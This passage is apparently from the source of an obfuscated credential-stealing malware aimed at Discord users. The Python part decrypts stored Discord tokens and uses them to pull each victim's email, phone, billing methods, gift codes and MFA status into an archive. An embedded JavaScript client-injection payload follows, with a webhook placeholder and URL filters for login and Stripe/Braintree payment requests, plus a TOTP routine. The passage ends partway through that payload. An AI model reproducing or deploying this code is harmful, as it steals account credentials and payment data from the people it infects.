        return VBEWVEGSIKVSVBSBLYITAXUVDRHOUEWQWXRPFCCSUZIIOXOAEOMMDIISPDKIF.decrypt(SIGZZBKBAMKEZSMEQQEAYVHSNTEXTADOSQQIUWYRGRKSQTQZSGNMOZRVSVCFX)[:-16].decode()

    def WHUYWXCTAIGIZTHPEZQPDWVVOAQALWRVRVHJMFPUGGXJDLEANZUXRQPQFMZZOGYUDOFZNVHAPQVYHEPSHJM(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
        if not os.path.exists(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
            return None
        with open(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, "r", encoding="utf-8") as v4r_f:
            DPTRTDTMJBXJXSKHJMMCVFGFIMZLFCGOWUTNRHPGKALMSEGEWBLQVUMXGOTMHQYIYJKZDFEC = json.load(v4r_f)
        JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX = base64.b64decode(DPTRTDTMJBXJXSKHJMMCVFGFIMZLFCGOWUTNRHPGKALMSEGEWBLQVUMXGOTMHQYIYJKZDFEC["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX, None, None, None, 0)[1]

    PAABVFPBZXRBGLWHIZFDMBBRBKQHACTHVHVNLPIXPNPJYIWCWMZGNNAESRYTBNEBKNZRADMRBHFSXAVAWNEC, VBHRVFMVDQDHNAZJDPQLUKMJXEBWLUGTMXHQWZSXMOEUSMUAWPXURHZPACRWQLUCOZVWUNLILAZWDXGSI = EGISOXAJDUTIBDBMKOIGRYUARNHGVXBMZATXOKBEKARKCJZFOAGZBWFYYPXQBANPSTUUL()
    
    if not PAABVFPBZXRBGLWHIZFDMBBRBKQHACTHVHVNLPIXPNPJYIWCWMZGNNAESRYTBNEBKNZRADMRBHFSXAVAWNEC:
        ARTQNEVRCYQMBIADRKLZDNMXBMDBLIHSRBWPWPUEPGFXSNXBLSTVDFQYJEEJXIPKRKSOVQHHRZ = "No discord tokens found."

    for IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR_d15c0rd in PAABVFPBZXRBGLWHIZFDMBBRBKQHACTHVHVNLPIXPNPJYIWCWMZGNNAESRYTBNEBKNZRADMRBHFSXAVAWNEC:
        PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD += 1

        try: BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR_d15c0rd}).json()
        except: BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA = {"None": "None"}

        COXZEZPHQRGYIVKRSDUXOEAFKVLQLPVNWTKYSCFHJTMROOURMJZXGITVGNVZAZQBIVJTRKDNBWNS = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('username', "None") + '#' + BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('discriminator', "None")
        QFUPQCJZJJNUOWQBTJTGRSJYZQBKSONXVXNZUVVCCLOHPQBBLOUDOMHNFEPSTTBNNOSPRNOZYIS = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('global_name', "None")
        URREKFCTIEYOXSTUAXBWZSJCXPGYRQZXNMYAUKGHNTICUWWRVBKBECGGUVLBS = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('id', "None")
        BCUPAJGGLDIJAJLXVBMDDMCAGWOAEOCJSAEPRWHLLPIGRAPHJFCHVQJUFUKPBCPMWIHFUGZV = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('email', "None")
        QGPMZKXKXZXOVRBHQCUXBIPKMDTARRGKKGSTMNZMTKIWINDKWGDCYQTWOBWXVHNEXIYNBT = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('verified', "None")
        LOHDXEKPBJBRDTFCFDIKVQXJCFVCJNRQDYGCEOGHYJSGXSGNFNIGRIXMVTOHHQPZWYWZGQBHBCTORWPFEKIDIRXT = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('phone', "None")
        KBYPOWPRWEWKBHADDKLOTYXFNNJOWFJCSBRIWJKNOQTYHKUCPQSWHPNKMNOCHHSHBXIBPHMCIAGFGUBELOGKLLONCWITR = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('locale', "None")
        ACXYRAJCZIROPHJEPHPZITCWUJCEKOYSORTFANXCOWEDCJLGZJEKMOFSGUBOHOBZR = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('mfa_enabled', "None")

        try:
            if BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('premium_type', 'None') == 0:
                FODIYJFZCJWDZQHBJELAAFSADWAWWDWELOYSGPEEOQWOHSYTJHQFCLIDMQXSQO = 'False'
            elif BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('premium_type', 'None') == 1:
                FODIYJFZCJWDZQHBJELAAFSADWAWWDWELOYSGPEEOQWOHSYTJHQFCLIDMQXSQO = 'Nitro Classic'
            elif BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('premium_type', 'None') == 2:
                FODIYJFZCJWDZQHBJELAAFSADWAWWDWELOYSGPEEOQWOHSYTJHQFCLIDMQXSQO = 'Nitro Boosts'
            elif BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('premium_type', 'None') == 3:
                FODIYJFZCJWDZQHBJELAAFSADWAWWDWELOYSGPEEOQWOHSYTJHQFCLIDMQXSQO = 'Nitro Basic'
            else:
                FODIYJFZCJWDZQHBJELAAFSADWAWWDWELOYSGPEEOQWOHSYTJHQFCLIDMQXSQO = 'False'
        except:
            FODIYJFZCJWDZQHBJELAAFSADWAWWDWELOYSGPEEOQWOHSYTJHQFCLIDMQXSQO = "None"

        try: PNRIVMVGJYNISGAHXJAKAMUHCTQQBOWRCLBLHEGXRTJULENJMJSAAPWLVWNOUUCYKNHCTPBGPNRCUQHIHC = f"https://cdn.discordapp.com/avatars/{URREKFCTIEYOXSTUAXBWZSJCXPGYRQZXNMYAUKGHNTICUWWRVBKBECGGUVLBS}/{BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{URREKFCTIEYOXSTUAXBWZSJCXPGYRQZXNMYAUKGHNTICUWWRVBKBECGGUVLBS}/{BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{URREKFCTIEYOXSTUAXBWZSJCXPGYRQZXNMYAUKGHNTICUWWRVBKBECGGUVLBS}/{BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA['avatar']}.png"
        except: PNRIVMVGJYNISGAHXJAKAMUHCTQQBOWRCLBLHEGXRTJULENJMJSAAPWLVWNOUUCYKNHCTPBGPNRCUQHIHC = "None"

        try:
            DQKOWRRLUDOIFZBSFPTUUVTDHCDLNLMWEWNHKKNCEOCRZSNVJYBYOEINFMQGYFODGOZXLUVLKGEGHJVECHNIPRIRJIUB = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR_d15c0rd}).json()
            if DQKOWRRLUDOIFZBSFPTUUVTDHCDLNLMWEWNHKKNCEOCRZSNVJYBYOEINFMQGYFODGOZXLUVLKGEGHJVECHNIPRIRJIUB:
                CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU = []

                for v4r_method in DQKOWRRLUDOIFZBSFPTUUVTDHCDLNLMWEWNHKKNCEOCRZSNVJYBYOEINFMQGYFODGOZXLUVLKGEGHJVECHNIPRIRJIUB:
                    if v4r_method['type'] == 1:
                        CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU.append("Paypal")
                    else:
                        CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU.append('Other')
                CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU = ' / '.join(CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU)
            else:
                CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU = "None"
        except:
            CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU = "None"

        try:
            OTXBLQOMQNKZMTMWXWOIJEIYPYGTPKKDIOGBFNMMWUCYHXRRFGTOQUMDZNOPGCTKJEHN = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR_d15c0rd}).json()
            if OTXBLQOMQNKZMTMWXWOIJEIYPYGTPKKDIOGBFNMMWUCYHXRRFGTOQUMDZNOPGCTKJEHN:
                MIXYDLPRTHNOGRCRSTIGURZJYMZUMASQEUXHBDMRTFEYXEHCUGGVUPMXFZKDLXWVRKLHQYWWQTMTFQMDFKFJICQE = []
                for MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU in OTXBLQOMQNKZMTMWXWOIJEIYPYGTPKKDIOGBFNMMWUCYHXRRFGTOQUMDZNOPGCTKJEHN:
                    HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW = MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU['promotion']['outbound_title']
                    MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU = MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU['code']
                    GVJXLGYSZTWOJASNAWBPTQUUAHIOIXWINFISIOZNVOXBEYYLJLQNYPELTODWCEIIGXHTMFCTYQXUWAQ = f"Gift: \"{HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW}\" Code: \"{MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU}\""
                    if len('\n\n'.join(MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU)) + len(GVJXLGYSZTWOJASNAWBPTQUUAHIOIXWINFISIOZNVOXBEYYLJLQNYPELTODWCEIIGXHTMFCTYQXUWAQ) >= 1024:
                        break
                    MIXYDLPRTHNOGRCRSTIGURZJYMZUMASQEUXHBDMRTFEYXEHCUGGVUPMXFZKDLXWVRKLHQYWWQTMTFQMDFKFJICQE.append(GVJXLGYSZTWOJASNAWBPTQUUAHIOIXWINFISIOZNVOXBEYYLJLQNYPELTODWCEIIGXHTMFCTYQXUWAQ)
                if len(MIXYDLPRTHNOGRCRSTIGURZJYMZUMASQEUXHBDMRTFEYXEHCUGGVUPMXFZKDLXWVRKLHQYWWQTMTFQMDFKFJICQE) > 0:
                    MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU = '\n\n'.join(MIXYDLPRTHNOGRCRSTIGURZJYMZUMASQEUXHBDMRTFEYXEHCUGGVUPMXFZKDLXWVRKLHQYWWQTMTFQMDFKFJICQE)
                else:
                    MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU = "None"
            else:
                MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU = "None"
        except:
            MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU = "None"
    
        try: v4r_software_name, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG = VBHRVFMVDQDHNAZJDPQLUKMJXEBWLUGTMXHQWZSXMOEUSMUAWPXURHZPACRWQLUCOZVWUNLILAZWDXGSI.get(IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG = "Unknown", "Unknown"

        ARTQNEVRCYQMBIADRKLZDNMXBMDBLIHSRBWPWPUEPGFXSNXBLSTVDFQYJEEJXIPKRKSOVQHHRZ = ARTQNEVRCYQMBIADRKLZDNMXBMDBLIHSRBWPWPUEPGFXSNXBLSTVDFQYJEEJXIPKRKSOVQHHRZ + f"""
Discord Account n°{str(PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD)}:
 - Path Found      : {ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG}
 - Software        : {v4r_software_name}
 - Token           : {IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR_d15c0rd}
 - Username        : {COXZEZPHQRGYIVKRSDUXOEAFKVLQLPVNWTKYSCFHJTMROOURMJZXGITVGNVZAZQBIVJTRKDNBWNS}
 - Display Name    : {QFUPQCJZJJNUOWQBTJTGRSJYZQBKSONXVXNZUVVCCLOHPQBBLOUDOMHNFEPSTTBNNOSPRNOZYIS}
 - Id              : {URREKFCTIEYOXSTUAXBWZSJCXPGYRQZXNMYAUKGHNTICUWWRVBKBECGGUVLBS}
 - Email           : {BCUPAJGGLDIJAJLXVBMDDMCAGWOAEOCJSAEPRWHLLPIGRAPHJFCHVQJUFUKPBCPMWIHFUGZV}
 - Email Verified  : {QGPMZKXKXZXOVRBHQCUXBIPKMDTARRGKKGSTMNZMTKIWINDKWGDCYQTWOBWXVHNEXIYNBT}
 - Phone           : {LOHDXEKPBJBRDTFCFDIKVQXJCFVCJNRQDYGCEOGHYJSGXSGNFNIGRIXMVTOHHQPZWYWZGQBHBCTORWPFEKIDIRXT}
 - Nitro           : {FODIYJFZCJWDZQHBJELAAFSADWAWWDWELOYSGPEEOQWOHSYTJHQFCLIDMQXSQO}
 - Language        : {KBYPOWPRWEWKBHADDKLOTYXFNNJOWFJCSBRIWJKNOQTYHKUCPQSWHPNKMNOCHHSHBXIBPHMCIAGFGUBELOGKLLONCWITR}
 - Billing         : {CHUVFLZXBEFHQWSHHQDFTFRBBORWJIBSBNYJWLXQBAIBUYGLCDNLZVHFUXAYGIQRCHPUONMMFU}
 - Gift Code       : {MRAEKWJXBOYTYLKAOWCPCYSNFFAKNSZYTTBNGLZATHRSPZMOYRUOFQEFDRRYCYUJIKPHVADUCXUASZTKYMDSBOWYXSU}
 - Profile Picture : {PNRIVMVGJYNISGAHXJAKAMUHCTQQBOWRCLBLHEGXRTJULENJMJSAAPWLVWNOUUCYKNHCTPBGPNRCUQHIHC}
 - Multi-Factor Authentication : {ACXYRAJCZIROPHJEPHPZITCWUJCEKOYSORTFANXCOWEDCJLGZJEKMOFSGUBOHOBZR}
"""
    FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(f"Discord Accounts ({PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD}).txt", ARTQNEVRCYQMBIADRKLZDNMXBMDBLIHSRBWPWPUEPGFXSNXBLSTVDFQYJEEJXIPKRKSOVQHHRZ)

    return PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD

SPVMQGOTSLUVRZMMIFHXOIBTNYNPZYGVYJJLYMQSRTEQSUZMKKLNIMITUWMZOXUYMCWOSMHDCZJGBEEGMJUJLOKAOQWBAOB = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }
